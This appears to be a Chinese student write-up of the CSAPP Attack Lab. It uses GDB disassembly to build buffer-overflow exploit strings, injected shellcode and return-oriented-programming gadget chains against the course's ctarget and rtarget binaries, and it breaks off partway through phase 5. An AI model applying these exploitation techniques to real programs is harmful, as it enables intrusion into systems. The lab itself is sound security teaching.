[toc]

# 00 Prerequisite

听见课堂上老爷子说：

```shell
	But to be a good person you also know what the bet have to know what the bad people do, so part of it is to become more effective as a force for good.
```

# Part 1: Code injection

   关于Attack的，攻击两个c代码，分别是`ctarget` 和`rtarget`，前3个阶段是关于 `ctarget` 后面2个是关于`rtarget`的，`Code injection` and `Return-oriented programming`. 

ctarget

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

关于**getbuf**实际上是在模拟c语言的库函数**gets**，这类函数容易出现**Overunning** on buffer 的现象

```c
1 unsigned getbuf()
2 {
3 char buf[BUFFER_SIZE];
4 Gets(buf);
5 return 1;
6 }
```

运用GDB调试 ctarget

执行命令

```shell
disas test
```

```cpp
Dump of assembler code for function test:
   0x0000000000401968 <+0>:	sub    $0x8,%rsp // 分配栈帧
   0x000000000040196c <+4>:	mov    $0x0,%eax
   0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:	mov    %eax,%edx // 返回值 -> %edx
       // 准备调用 printf 函数
   0x0000000000401978 <+16>:	mov    $0x403188,%esi // 0x403188 -> %esi
   0x000000000040197d <+21>:	mov    $0x1,%edi // Load rdi ready to call fun print
   0x0000000000401982 <+26>:	mov    $0x0,%eax
   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:	add    $0x8,%rsp
   0x0000000000401990 <+40>:	retq 
```

对于`0x401388`的地址check一下，是对应的`printf`输出的内容

```shell
(gdb) x/s 0x403188
0x403188:	"No exploit.  Getbuf returned 0x%x\n"
```



执行命令

```shell
(gdb) disas getbuf
```

```cpp
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp // 分配 40bytes的栈帧
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.
```





```shell
disas Gets
```

```cpp
Dump of assembler code for function Gets:
   0x0000000000401a40 <+0>:	push   %r12
   0x0000000000401a42 <+2>:	push   %rbp
   0x0000000000401a43 <+3>:	push   %rbx
   0x0000000000401a44 <+4>:	mov    %rdi,%r12
   0x0000000000401a47 <+7>:	movl   $0x0,0x2036b3(%rip)        # 0x605104 <gets_cnt>
   0x0000000000401a51 <+17>:	mov    %rdi,%rbx
   0x0000000000401a54 <+20>:	jmp    0x401a67 <Gets+39>
   0x0000000000401a56 <+22>:	lea    0x1(%rbx),%rbp
   0x0000000000401a5a <+26>:	mov    %al,(%rbx)
   0x0000000000401a5c <+28>:	movzbl %al,%edi
   0x0000000000401a5f <+31>:	callq  0x4019a0 <save_char>
   0x0000000000401a64 <+36>:	mov    %rbp,%rbx
   0x0000000000401a67 <+39>:	mov    0x202a62(%rip),%rdi        # 0x6044d0 <infile>
   0x0000000000401a6e <+46>:	callq  0x400dc0 <_IO_getc@plt>
   0x0000000000401a73 <+51>:	cmp    $0xffffffff,%eax
   0x0000000000401a76 <+54>:	je     0x401a7d <Gets+61>
   0x0000000000401a78 <+56>:	cmp    $0xa,%eax
   0x0000000000401a7b <+59>:	jne    0x401a56 <Gets+22>
   0x0000000000401a7d <+61>:	movb   $0x0,(%rbx)
   0x0000000000401a80 <+64>:	mov    $0x0,%eax
--Type <RET> for more, q to quit, c to continue without paging--y
   0x0000000000401a85 <+69>:	callq  0x4019f8 <save_term>
   0x0000000000401a8a <+74>:	mov    %r12,%rax
   0x0000000000401a8d <+77>:	pop    %rbx
   0x0000000000401a8e <+78>:	pop    %rbp
   0x0000000000401a8f <+79>:	pop    %r12
   0x0000000000401a91 <+81>:	retq   
End of assembler dump.

```



## 1.1 phase_1

截取`test`的控制流，在调用完`getbuf`之后，buffer溢出，进而导致函数`getbuf`的返回地址（存储在`test`里面的）被覆盖，而覆盖的内容，就是函数`touch1`的入口地址`0x00000000004017c0`

```c
1 void touch1()
2 {
    3 vlevel = 1; /* Part of validation protocol */
    4 printf("Touch1!: You called touch1()\n");
    5 validate(1);
    6 exit(0);
7 }
```

```shell
(gdb) disas touch1
```

```cpp
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:	sub    $0x8,%rsp
   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi // "Touch1!: You called touch1()"
   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
End of assembler dump.

```

设计`ans1.txt`里面，前40个字节填充任意，故意在40 字节之后，写入`0x00000000004017c0`

```shell
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

使用下面命令，将16进制，转变成我们需要输入的字符串的形式，00 -> 0x30 01 -> 0x31 关于ASCII 字符的转变。

```shell
./hex2raw < ans1.txt  > ans1_raw.txt
./ctarget -q  < ans1_raw.txt
```

结果为，调用成功，改变了test内调用函数 getbuf之后的返回地址。

```shell
dargon@dd:~/桌面/CSAPP/lab3_attack/target1$ ./ctarget -q  < ans1_raw.txt 
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
```



## 1.2 phase_2

关于`touch2`，`test`函数的返回地址应该转移到`0x00000000004017ec`

```cpp
1 void touch2(unsigned val)62 {    3 vlevel = 2; /* Part of validation protocol */    4 if (val == cookie) {        5 printf("Touch2!: You called touch2(0x%.8x)\n", val);        6 validate(2);    7 } else {        8 printf("Misfire: You called touch2(0x%.8x)\n", val);        9 fail(2);    10 }    11 exit(0);12 }
```

```shell
(gdb) disas touch2
```

```assembly
Dump of assembler code for function touch2:   0x00000000004017ec <+0>:	sub    $0x8,%rsp // allocate stack frame   0x00000000004017f0 <+4>:	mov    %edi,%edx   0x00000000004017f2 <+6>:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>   0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56> # jump mark_1   0x0000000000401804 <+24>:	mov    $0x4030e8,%esi   # check address 0x4030e8 "Touch2!: You called touch2(0x%.8x)\n"   0x0000000000401809 <+29>:	mov    $0x1,%edi   0x000000000040180e <+34>:	mov    $0x0,%eax   0x0000000000401813 <+39>:	callq  0x400df0 <__printf_chk@plt>   0x0000000000401818 <+44>:	mov    $0x2,%edi   0x000000000040181d <+49>:	callq  0x401c8d <validate>   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>   # come here! mark_1   0x0000000000401824 <+56>:	mov    $0x403110,%esi   # check address 0x403110 "Misfire: You called touch2(0x%.8x)\n"   0x0000000000401829 <+61>:	mov    $0x1,%edi   0x000000000040182e <+66>:	mov    $0x0,%eax   0x0000000000401833 <+71>:	callq  0x400df0 <__printf_chk@plt>   0x0000000000401838 <+76>:	mov    $0x2,%edi   0x000000000040183d <+81>:	callq  0x401d4f <fail>   0x0000000000401842 <+86>:	mov    $0x0,%edi   0x0000000000401847 <+91>:	callq  0x400e40 <exit@plt>--Type <RET> for more, q to quit, c to continue without paging--cEnd of assembler dump.
```

touch2的逻辑相对比较简单，判断输入参数`%rdi`的是否和 `0x202ce2(%rip)`相等，也就是说，我们需要输入的参数`=0x202ce2(%rip)`才可以。

很明显，现在需要做两件事情

1. 将函数`touch2`输入参数，也即是`%rdi =0x202ce2(%rip)`
2. 将`getbuf`的返回地址设置到函数`touch2`的入口地址 `0x4017ec`



***

* 针对于第1个问题：

如何才能获得`=0x202ce2(%rip)`，不妨先将`0x00000000004017ec`作为返回地址插入进去（利用level1的方法）去运行一下，利用`GDB	`调试打印看看。

设计`ans2.txt`

```shell
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00ec 17 40 00 00 00 00 00
```

执行命令，先打一个`breakpoint`在`0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi`这行代码的位置

```shell
(gdb) b *0x4017fcBreakpoint 1 at 0x4017fc: file visible.c, line 42.(gdb) info bNum     Type           Disp Enb Address            What1       breakpoint     keep y   0x00000000004017fc in touch2 at visible.c:42
```

可以利用`GDB`查看`cookie`的值是`0x59b997fa`，没想到只要是运行`test`函数，这个`cookie`值都是一样的

```shell
(gdb) run -q < ans2_raw.txt Starting program: /home/dargon/桌面/CSAPP/lab3_attack/target1/ctarget -q < ans2_raw.txtCookie: 0x59b997faBreakpoint 1, touch2 (val=4160412032) at visible.c:4242	visible.c: 没有那个文件或目录.(gdb) stepi0x0000000000401802	42	in visible.c(gdb) p $edi$1 = -134555264(gdb) p $rip$2 = (void (*)()) 0x401802 <touch2+22>(gdb) p *(int*)($rip+0x202ce2)$3 = 1505335290(gdb) p /x *(int*)($rip+ 0x202ce2)$4 = 0x59b997fa(gdb) 
```

* 针对于第2个问题：

`touch2`函数的入口地址直接就是`0x4017ec`

***

知乎作者周小伦提出，直接插入汇编代码

```assembly
movq    $0x59b997fa, %rdipushq   $0x4017ecret
```

将其运行之后，可以看见其二进制指令编码

```shell
gcc -c l2.sobjdump -d l2.o
```

```assembly
l2.o：     文件格式 elf64-x86-64Disassembly of section .text:0000000000000000 <.text>:   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi   7:	68 ec 17 40 00       	pushq  $0x4017ec   c:	c3                   	retq 
```

不理解的点：

执行完`getbuf`之后，回到`%rsp`这里，接着执行上面的三行汇编代码，就可以成功进入`touch2`执行。

***

**上面的两个问题解决之后，就是如何执行这两条指令，这是比较关键的地方。**

1. 首先将三条汇编代码写入到缓冲区里面
2. 利用Level1的方法，将执行完`getbuf`的返回地址，跳转到缓冲区的位置（根据`getbuf`找到缓冲区的位置）
3. 紧接着会执行缓冲区里面的代码，代码的含义
   1. 将参数寄存器`%rdi`赋值，以供`touch2`函数参数使用
   2. 将调用函数`touch2`的返回地址入栈，执行`ret`的时候，会返回到这个地址，就去执行`touch2`的内容。

***

* 查看`getbuf`的内容，找到缓冲区的入口地址

```assembly
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.
```

在`4017ac`设置断点

```shell
(gdb) b *0x4017ac
Breakpoint 2 at 0x4017ac: file buf.c, line 14.

0x00000000004017af	14	in buf.c
(gdb) p $rsp
$5 = (void *) 0x5561dc78
```

得到缓冲区地址为`0x5561dc78`

设计注入代码

ans2.txt

```shell
48 c7 c7 fa 97 b9 59 68 # 执行代码
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 # 缓冲区的地址
```

接下来执行

```shell
dargon@dd:~/桌面/CSAPP/lab3_attack/target1$ ./hex2raw < ans2.txt  > ans2_raw.txtdargon@dd:~/桌面/CSAPP/lab3_attack/target1$ ls
ans1_raw.txt  ans2_raw.txt  cookie.txt  farm.c   l2.o  README.txt
ans1.txt      ans2.txt      ctarget     hex2raw  l2.s  rtarget
dargon@dd:~/桌面/CSAPP/lab3_attack/target1$ cat ans2_raw.txt 
H�����Yh�@�x�aU
dargon@dd:~/桌面/CSAPP/lab3_attack/target1$ ./ctarget < ans2_raw.txt 
FAILED: Initialization error: Running on an illegal host [dd]
dargon@dd:~/桌面/CSAPP/lab3_attack/target1$ ./ctarget -q < ans2_raw.txt 
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```

运行成功！

分析此时的栈帧

| 地址                                             | 内容                    |
| ------------------------------------------------ | ----------------------- |
| 0x5561dca0  （getbuf的返回地址）以上是test的栈帧 | 00 00 00 00 55 61 dc 78 |
| rsp+20 （以下分别对应 getbuf的缓冲区）           | 00 00 00 00 00 00 00 00 |
| rsp+18                                           | 00 00 00 00 00 00 00 00 |
| rsp+10                                           | 00 00 00 00 00 00 00 00 |
| rsp+08                                           | 00 00 00 00 00 00 00 00 |
| rsp                                              | 00 00 00 00 00 00 00 00 |

## 1.3 phase_3

关于`touch3`和`hexmatch`

```c
1 /* Compare string to hex represention of unsigned value */
2 int hexmatch(unsigned val, char *sval)
3 {
    4 char cbuf[110];
    5 /* Make position of check string unpredictable */
        6 char *s = cbuf + random() % 100;
    7 sprintf(s, "%.8x", val);
    8 return strncmp(sval, s, 9) == 0;
9 }

11 void touch3(char *sval)
12 {
    13 vlevel = 3; /* Part of validation protocol */
    14 if (hexmatch(cookie, sval)) {
        15 printf("Touch3!: You called touch3(\"%s\")\n", sval);
        16 validate(3);
        17 } else {
        18 printf("Misfire: You called touch3(\"%s\")\n", sval);
        19 fail(3);
        20 }
    21 exit(0);
22 }
```

分析`level3`的主要功能，我们需要传递给` touch3`的 `cookie`的字符串形式，进行比较之后，然后在进行调用函数

查看`touch3`的内容

```assembly
Dump of assembler code for function touch3:
   0x00000000004018fa <+0>:	push   %rbx
   0x00000000004018fb <+1>:	mov    %rdi,%rbx
   0x00000000004018fe <+4>:	movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:	mov    %rdi,%rsi
   0x000000000040190b <+17>:	mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   # %rdi -->%rsi(*sval), %edi(cookie)
   0x0000000000401911 <+23>:	callq  0x40184c <hexmatch>
   0x0000000000401916 <+28>:	test   %eax,%eax
   0x0000000000401918 <+30>:	je     0x40193d <touch3+67>
   0x000000000040191a <+32>:	mov    %rbx,%rdx
   0x000000000040191d <+35>:	mov    $0x403138,%esi
   0x0000000000401922 <+40>:	mov    $0x1,%edi
   0x0000000000401927 <+45>:	mov    $0x0,%eax
   0x000000000040192c <+50>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401931 <+55>:	mov    $0x3,%edi
   0x0000000000401936 <+60>:	callq  0x401c8d <validate>
   0x000000000040193b <+65>:	jmp    0x40195e <touch3+100>
   0x000000000040193d <+67>:	mov    %rbx,%rdx
   0x0000000000401940 <+70>:	mov    $0x403160,%esi
   0x0000000000401945 <+75>:	mov    $0x1,%edi
   0x000000000040194a <+80>:	mov    $0x0,%eax
   0x000000000040194f <+85>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401954 <+90>:	mov    $0x3,%edi
   0x0000000000401959 <+95>:	callq  0x401d4f <fail>
   0x000000000040195e <+100>:	mov    $0x0,%edi
   0x0000000000401963 <+105>:	callq  0x400e40 <exit@plt>
End of assembler dump.

```

执行命令

```shell
disas test
```

```cpp
Dump of assembler code for function test:
   0x0000000000401968 <+0>:	sub    $0x8,%rsp // 分配栈帧
   0x000000000040196c <+4>:	mov    $0x0,%eax
   0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:	mov    %eax,%edx // 返回值 -> %edx
       // 准备调用 printf 函数
   0x0000000000401978 <+16>:	mov    $0x403188,%esi // 0x403188 -> %esi
   0x000000000040197d <+21>:	mov    $0x1,%edi // Load rdi ready to call fun print
   0x0000000000401982 <+26>:	mov    $0x0,%eax
   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:	add    $0x8,%rsp
   0x0000000000401990 <+40>:	retq 
```

```shell
(gdb) disas getbuf
```

```cpp
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp // 分配 40bytes的栈帧
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.
       
```

由于`hexmatch`也同样的开辟了`110bytes`的栈帧，并且里面调用的函数和局部变量`s`是一个随机的存储在栈上的位置，可能会覆盖到`getbuf`的缓冲区，所以我们的注入代码要放在一个安全的位置，放置在`text`的栈帧中，放在这里，无论怎样也是`*s`覆盖不到的地方。

在`getbuf`分配栈帧之前，打一断点

```shell
(gdb) b *0x4017a8
Breakpoint 1 at 0x4017a8: file buf.c, line 12.
(gdb) info b
Num     Type           Disp Enb Address            What
1       breakpoint     keep y   0x00000000004017a8 in getbuf at buf.c:12
(gdb) r -q
Starting program: /home/dargon/桌面/CSAPP/lab3_attack/target1/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12
12	buf.c: 没有那个文件或目录.
(gdb) p $rsp
$1 = (void *) 0x5561dca0
(gdb) p /x  *(int*)($rsp)
$2 = 0x401976
```

再向下运行两步，得出`getbuf`的`rsp`的返回地址

```assembly
(gdb) p $rsp
$3 = (void *) 0x5561dc78
```

可以看出未分配之前的`test`的`rsp =0x5561dca0`里面的内容即是 `*rsp =0x401976`对应于`getbuf`的返回地址。

放一张`test`调用函数`getbuf`时候，栈帧的示意图

![](E:\Codefield\Code_C\CSAPP\Linux命令手册\Graph\03_02stack.png)



| 地址                                             | 内容                    |
| ------------------------------------------------ | ----------------------- |
| 0x5561dca8                                       |                         |
| 0x5561dca0  （getbuf的返回地址）以上是test的栈帧 | 00 00 00 00 00 40 19 76 |
| rsp+20 （以下分别对应 getbuf的缓冲区）           | 00 00 00 00 00 00 00 00 |
| rsp+18                                           | 00 00 00 00 00 00 00 00 |
| rsp+10                                           | 00 00 00 00 00 00 00 00 |
| rsp+08                                           | 00 00 00 00 00 00 00 00 |
| rsp                                              | 00 00 00 00 00 00 00 00 |



**关键分析**

**我们调用`touch3`的时候需要传递给它一个 `*sval`一个字符串数组的起始地址，为防止在`getbuf`的缓冲区里面被覆盖，将该`cookie =0x59b997fa`的字符串放在`test`的栈帧`0x5561dca8`里面，然后在利用缓冲区溢出将 `getbuf` 的返回地址设置成`rsp`，使用`level2`里面的技巧。**

```assembly
movq $0x5561dca8 %rdi
pushq  $0x4018fa
retq
```

反汇编，取其指令码如下

```assembly
l3.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq 
```

所以构建 注入代码 ，

1. 代码溢出准备返回到`0x5561dc78`，
2. 将`cookie =0x59b997fa`写成字符串的形式应该是`35 39 62 39 39 37 66 61`放置到`test`的栈帧中`0x5561dca8`位置处。

```shell
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
# 以上填补 40字节的缓冲区
78 dc 61 55 00 00 00 00 <- getbuf 的返回地址 
35 39 62 39 39 37 66 61 
```

运行结果PASS

```shell
dargon@dd:~/桌面/CSAPP/lab3_attack/target1$ ./ctarget -q < ans3_raw.txt 
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
```

分析此时的栈帧，这里需要换一个位置存储 `cookie`试一下如何

| 地址                                             | 内容                    |
| ------------------------------------------------ | ----------------------- |
| 0x5561dca8 （存储cookie的地方）                  | 61 66 37 39 39 62 39 35 |
| 0x5561dca0  （getbuf的返回地址）以上是test的栈帧 | 00 00 00 00 55 61 dc 78 |
| rsp+20 （以下分别对应 getbuf的缓冲区）           | 00 00 00 00 00 00 00 00 |
| rsp+18                                           | 00 00 00 00 00 00 00 00 |
| rsp+10                                           | 00 00 00 00 00 00 00 00 |
| rsp+08                                           | 00 00 00 00 00 00 00 00 |
| rsp                                              | 00 00 00 00 00 00 00 00 |

运行前的栈帧分配图

![](E:\Codefield\Code_C\CSAPP\Linux命令手册\Graph\03_03l3stack.png)

# Part2: Returned-Oriented Programming

## 2.1 phase_4

同样的和`phase_2`一样，截取的`test`的控制流，执行`touch2`的内容。不过这里是不能用代码注入的方式，由于说明中增加了两种限制：

1. 栈的位置随机化
2. 栈里面的内容是 不可执行的` non- executable`

依旧是通过`getbuf`导致缓冲区的溢出，对`test`函数进行攻击

再看下`test`和`getbuf`的内容

```shell
(gdb) disas test
```

```assembly
Dump of assembler code for function test:
   0x0000000000401968 <+0>:	sub    $0x8,%rsp
   0x000000000040196c <+4>:	mov    $0x0,%eax
   0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:	mov    %eax,%edx
   0x0000000000401978 <+16>:	mov    $0x4032a8,%esi
   0x000000000040197d <+21>:	mov    $0x1,%edi
   0x0000000000401982 <+26>:	mov    $0x0,%eax
   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:	add    $0x8,%rsp
   0x0000000000401990 <+40>:	retq   
End of assembler dump.
```

```shell
(gdb) disas getbuf
```

```assembly

Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401b60 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.
```



通过手册可以看到， `pop %rdi`对应的指令就是`5f`

![](E:\Codefield\Code_C\CSAPP\Linux命令手册\Graph\03_04_pop操作.png)

* **第一次尝试**

通过寻找`5f`，找出下面对应的代码

```assembly
  402b18:	41 5f                	pop    %r15
  402b1a:	c3                   	retq 
```

则对应的`0x402b18<-->41`和`0x402b19<-->5f`

我们将`5f<-->pop %rdi`，对于入栈和出栈的方式，

1. `push %reg`：`%rsp`的值减8，把寄存器`%reg`里面的值，放入到`[%rsp]`里面
2. `pop %reg`: 把`[%rsp]`里面的值给`%reg`中，`%rsp`的值再加上8

对应的`touch2`的首位地址是`0x4017ec`

构建输入的字符串

```shell
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 # 填补40字节缓冲区

19 2b 40 00 00 00 00 00 # pop %rdi 对应的getbuf的返回地址
fa 97 b9 59 00 00 00 00 # cookie
ec 17 40 00 00 00 00 00 # touch2 的首地址
```

当 我尝试运行的时候，jj了，FAIL!

```shell
dargon@dd:~/桌面/CSAPP/lab3_attack/target1$ ./rtarget -q < ans4_raw.txt 
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:FAIL:0xffffffff:rtarget:0:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 19 2B 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00 
```

> 我是没有想到哪里可以引起`segmentation fault`，也即是可以执行了栈里面的内容

* **第二次尝试**

当我尝试构建`expolit strings`的时候，利用`0x40141b`的位置取出`5f c3`的字码

```assembly
401419:	69 c0 5f c3 00 00    	imul   $0xc35f,%eax,%eax
```

```shell
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 # 填补40字节缓冲区

1b 14 40 00 00 00 00 00 # pop %rdi 对应的getbuf的返回地址
fa 97 b9 59 00 00 00 00 # cookie
ec 17 40 00 00 00 00 00 # touch2 的首地址
```

进行`./hex2match`之后，依然是`segmentation fault`

* **第三次尝试**

下面开始从另一方面去寻找

```assembly
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq  
```

可以看出

1. `mov %rax, %rdi <--> 48 89 c7`是从`0x4019a2`开始的

2. `pop %rax <--> 58`是从`0x4019ab`开始，执行`58 90 c3`相对来说，多了一个`90`指令在里面

   

接下来开始构建我们的答案

```shell
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 # 填补40字节缓冲区

ab 19 40 00 00 00 00 00 # popq %rax 对应的getbuf的返回地址
fa 97 b9 59 00 00 00 00 # cookie
a2 19 40 00 00 00 00 00 # movq %rax, %rdi 
ec 17 40 00 00 00 00 00 # touch2 的首地址
```

进行测试，PASS！！！

```shell
dargon@dd:~/桌面/CSAPP/lab3_attack/target1$ ./hex2raw < ans4.txt > ans4_raw.txt
dargon@dd:~/桌面/CSAPP/lab3_attack/target1$ ./rtarget -q < ans4_raw.txt 
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```

第一、二次的问题是在于，寻找的`gadget`指令码的位置，应该是在`start_farm`和`end_farm`之间去寻找，而前两次找到的指令码是对的，但是不是在该允许范围内。

在官网`write up`中有详细说明

>Important: The gadget farm is demarcated by functions start_farm and end_farm in your copy of
>rtarget. Do not attempt to construct gadgets from other portions of the program code.

还是得认真遵守规则啊，迎接最后一个`phase5`

## 2.2 Phase_5

同样的问题是需要处理`phase_3`的操作，需要使得`touch3`的注入到`test`里面。

关于`touch3`和`hexmatch`

```c
1 /* Compare string to hex represention of unsigned value */
2 int hexmatch(unsigned val, char *sval)
3 {
    4 char cbuf[110];
    5 /* Make position of check string unpredictable */
        6 char *s = cbuf + random() % 100;
    7 sprintf(s, "%.8x", val);
    8 return strncmp(sval, s, 9) == 0;
9 }

11 void touch3(char *sval)
12 {
    13 vlevel = 3; /* Part of validation protocol */
    14 if (hexmatch(cookie, sval)) {
        15 printf("Touch3!: You called touch3(\"%s\")\n", sval);
        16 validate(3);
        17 } else {
        18 printf("Misfire: You called touch3(\"%s\")\n", sval);
        19 fail(3);
        20 }
    21 exit(0);
22 }
```

将`cookie =0x59b997fa`转化为字符串

```shell
35 39 62 39 39 37 66 61 00 # 对应着 NULL 字符结尾
```

来自知乎林恩的思路：

1. 由于栈开始了随机化，所以不能单纯地向`phase_3`那样直接将代码插入到一个绝对地址上然后执行缓冲区内的代码，`phase_5`的栈是`non-executable`。
2. `getbuf`开通了`0x28`字节的空间，如果把`cookie`的字符串插入到该空间里，在`touch3`中，`hexmatch`开辟了`110`字节的空间，由于局部变量`*s`是随机的，在`touch3`的栈帧空间中是不确定的，可能会覆盖到`cookie`的内容，所以需要插入更高的地址，所以要存入到`touch3`更高的地址处`test`的栈帧中。所以存储`cookie`字符串的地址，就需要`%rsp +bias`。
3. 对应的没有直接加法指令，使用`farm`里面的指令即是

```assembly
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq  
```

上述实现`%rdi +%rsi =%rax`

在后面的代码中的具体操作就是

* 把`%rsp`里的栈指针放到`%rdi`里面
* 拿到`bias`的值，放进`%rsi`里面
* 利用 `add_xy`，把栈指针地址和`bias`加起来放到`%rax`，在传到`%rdi`里面
* 在调用`touch3`首地址

```assembly
movq %rsp, %rax # 把%rsp里的栈指针放到%rax 48 89 e0
